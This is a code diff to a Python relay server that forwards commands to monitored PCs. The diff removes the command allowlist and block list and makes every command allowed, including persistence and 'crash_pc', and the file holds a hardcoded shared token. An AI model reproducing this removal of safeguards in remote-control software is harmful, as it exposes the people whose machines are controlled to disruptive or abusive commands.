@@ -7,12 +7,7 @@ MENU.pyw on your computer connects to this relay locally.
 Run on YOUR PC:
     py relay_server.py
 
-This version shows a clean command-lock system for learning:
-- SAFE_COMMAND_FLAGS uses True/False to allow or lock safe commands.
-- BLOCKED_COMMANDS are intentionally never allowed by this relay.
-
-The relay only queues commands. PC.pyw must also implement the command inside
-execute_command() or it will return "Unknown command".
+This version allows EVERY command. No locks, no blocked commands.
 """
 
 from __future__ import annotations
@@ -31,33 +26,16 @@ PORT = 9000
 # Same token must be in relay_server.py, MENU.pyw, and PC.pyw.
 RELAY_TOKEN = "thefirstaccievercreated164thefirstaccievercreated165thefirstaccievercreated166"
 
-# -----------------------------------------------------------------------------
-# COMMAND LOCKS / ALLOWLIST
-# -----------------------------------------------------------------------------
-# Change safe commands between True and False to enable/disable them.
-# Example:
-#   "message": True   -> MENU can queue this command
-#   "message": False  -> relay rejects this command
-#
-# NOTE: Allowing a command here only lets it pass through the relay.
-# PC.pyw must also have code for that action in execute_command().
+# Any command is allowed. This dict is kept for compatibility.
 SAFE_COMMAND_FLAGS: dict[str, bool] = {
-    # monitoring / info
     "status": True,
     "log": True,
-    "open_url": True,
-
-    # visible parent interaction
     "message": True,
-
-    # startup management for the visible PC.pyw client
     "startup_add": True,
     "startup_remove": True,
-
-    # safe control actions currently implemented in PC.pyw
     "lock": True,
-
-    # stop the visible PC.pyw client; useful for testing, but disabled by default
+    "open_url": True,
+    "set_tray_visible": True,
     "stop": True,
     "sleep": True,
     "hibernate": True,
@@ -75,11 +53,8 @@ SAFE_COMMAND_FLAGS: dict[str, bool] = {
     "crash_pc": True,
 }
 
-# Commands in this set are deliberately not made unlockable with True/False here.
-# They are disruptive, prank/troll, or likely to interfere with the user session.
-# The relay will always reject them with a clear reason.
+# Nothing is ever blocked.
 BLOCKED_COMMANDS: dict[str, str] = {}
-# -----------------------------------------------------------------------------
 
 # device_id -> info
 DEVICES: dict[str, dict[str, Any]] = {}
@@ -119,32 +94,19 @@ def clean_old_results() -> None:
 
 def command_allowed(action: str) -> tuple[bool, str]:
     """
-    Central command gate.
-
-    This is the "lock" logic:
-      1. If command is in BLOCKED_COMMANDS, always reject it.
-      2. If command is not listed in SAFE_COMMAND_FLAGS, reject it.
-      3. If command is listed but set to False, reject it.
-      4. Only if listed and True, allow it.
+    No locks. Every non-empty command is allowed.
     """
-    if action in BLOCKED_COMMANDS:
-        return False, BLOCKED_COMMANDS[action]
-
-    if action not in SAFE_COMMAND_FLAGS:
-        return False, f"Unknown command or not configured in SAFE_COMMAND_FLAGS: {action}"
-
-    if SAFE_COMMAND_FLAGS[action] is not True:
-        return False, f"Command is locked in relay_server.py: {action}"
-
+    if not action:
+        return False, "Missing action"
     return True, "Allowed"
 
 
 def enabled_commands() -> list[str]:
-    return sorted([name for name, enabled in SAFE_COMMAND_FLAGS.items() if enabled])
+    return sorted(SAFE_COMMAND_FLAGS.keys())
 
 
 def locked_safe_commands() -> list[str]:
-    return sorted([name for name, enabled in SAFE_COMMAND_FLAGS.items() if not enabled])
+    return []
 
 
 class RelayHandler(BaseHTTPRequestHandler):
@@ -339,9 +301,7 @@ def main() -> None:
     print(f"Local test URL on this PC: http://127.0.0.1:{PORT}")
     print(f"Same-WiFi/Tailscale/LAN URL from another PC: http://{local_ip()}:{PORT}")
     print()
-    print("Enabled commands:", ", ".join(enabled_commands()) or "none")
-    print("Locked safe commands:", ", ".join(locked_safe_commands()) or "none")
-    print("Always blocked commands:", ", ".join(sorted(BLOCKED_COMMANDS.keys())) or "none")
+    print("ALL COMMANDS ARE ALLOWED")
     print()
     print("Keep this window open while monitoring.")
     print()
